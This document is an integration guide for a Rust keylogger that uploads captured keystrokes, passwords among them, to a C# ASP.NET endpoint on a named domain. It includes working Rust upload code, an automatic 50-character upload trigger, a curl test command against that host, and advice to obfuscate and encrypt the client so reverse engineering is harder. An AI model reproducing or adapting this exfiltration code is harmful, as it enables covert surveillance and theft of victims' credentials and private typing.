# API Integration Guide

## Overview
The Rust keylogger sends captured keystrokes to a C# ASP.NET API endpoint via HTTP POST requests.

## API Endpoint Configuration

**URL Format:**
```
POST https://keylogger.delphigamerz.xyz/log?username={USERNAME}
Content-Type: text/plain
Body: {keystroke_buffer}
```

## Request Details

### Query Parameters
- `username` (required): Identifier for the client sending logs
  - Example: `user1`, `workstation-01`, `laptop-home`
  - Used to create separate log files per client

### Headers
- `Content-Type: text/plain` - The body is raw text (not JSON)

### Body
Raw text string containing captured keystrokes, for example:
```
Hello World!
This is a test.
Password123
```

## C# Endpoint Behavior

The C# endpoint (`/log`) does the following:

1. **Validates username**: Returns 400 Bad Request if missing
2. **Validates content**: Returns 400 Bad Request if body is empty
3. **Sanitizes username**: Uses `Path.GetFileName()` to prevent directory traversal
4. **Creates directory structure**:
   - Windows: `C:\root\uploads\{username}\`
   - Linux: `/root/uploads/{username}/`
5. **Appends to log file**: `keylogger.log` in the user's directory
6. **Thread-safe writes**: Uses `SemaphoreSlim` per user to prevent concurrent write conflicts
7. **Returns 200 OK**: On successful write

## Rust Client Implementation

### Configuration
```rust
const API_URL: &str = "https://keylogger.delphigamerz.xyz/log";
const USERNAME: &str = "user1";
const BUFFER_UPLOAD_SIZE: usize = 50;
```

### Upload Function
```rust
fn send_key_logs(client: &Client, buffer: &str) -> Result<(), Box<dyn std::error::Error>> {
    let url = format!("{}?username={}", API_URL, USERNAME);
    
    let response = client
        .post(&url)
        .body(buffer.to_string())
        .header("Content-Type", "text/plain")
        .send()?;

    if response.status().is_success() {
        Ok(())
    } else {
        Err(format!("Server returned status: {}", response.status()).into())
    }
}
```

### Upload Trigger
Uploads automatically when buffer reaches 50 characters:
```rust
if buffer.len() >= BUFFER_UPLOAD_SIZE {
    match send_key_logs(&client, &buffer) {
        Ok(_) => {
            buffer.clear(); // Clear after success
        },
        Err(e) => {
            println!("[ERROR] {}", e);
            // Buffer retained for retry
        }
    }
}
```

## Error Handling

### Client-Side (Rust)
- Network errors: Logged, buffer retained
- HTTP errors: Logged with status code, buffer retained
- Success: Buffer cleared, ready for new keystrokes

### Server-Side (C#)
- Missing username: 400 Bad Request
- Empty content: 400 Bad Request
- Directory creation failure: 500 Problem
- File write failure: 500 Problem
- Success: 200 OK

## Example Flow

```
1. User types: "Hello"
   Buffer: "Hello" (5 chars)

2. User types: " World"
   Buffer: "Hello World" (11 chars)

3. User continues typing...
   Buffer: "Hello World this is a test of the keylogger app" (50 chars)

4. UPLOAD TRIGGERED
   POST https://keylogger.delphigamerz.xyz/log?username=user1
   Body: "Hello World this is a test of the keylogger app"
   
5. Server Response: 200 OK

6. Buffer cleared, logging continues...
```

## Security Considerations

### HTTPS
- All data transmitted over HTTPS (TLS encryption)
- Protects keystrokes in transit

### Server-Side Security
- Username sanitization prevents path traversal attacks
- Per-user file locking prevents race conditions
- Directory permissions should be restricted

### Client-Side Security
- Consider obfuscating USERNAME constant
- Consider encrypting buffer before upload
- Use release builds to prevent easy reverse engineering

## Testing

### Test with cURL
```bash
curl -X POST "https://keylogger.delphigamerz.xyz/log?username=test_user" \
     -H "Content-Type: text/plain" \
     -d "Test keystroke data"
```

### Expected Server Log
```
[DEBUG_LOG] Received log request for username: 'test_user'
[DEBUG_LOG] Safe username: 'test_user'
[DEBUG_LOG] Creating directory: C:\root\uploads\test_user
[DEBUG_LOG] Appending content to C:\root\uploads\test_user\keylogger.log
[DEBUG_LOG] Successfully wrote to C:\root\uploads\test_user\keylogger.log
```

## Customization Options

### Change Upload Frequency
```rust
const BUFFER_UPLOAD_SIZE: usize = 100; // Upload every 100 chars
```

### Change Username
```rust
const USERNAME: &str = "laptop-home"; // Use descriptive names
```

### Change API URL
```rust
const API_URL: &str = "https://your-domain.com/api/logs";
```

### Add Timestamp to Logs
```rust
use chrono::Local;

let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
let content = format!("[{}] {}", timestamp, buffer);
// Upload 'content' instead of 'buffer'
```

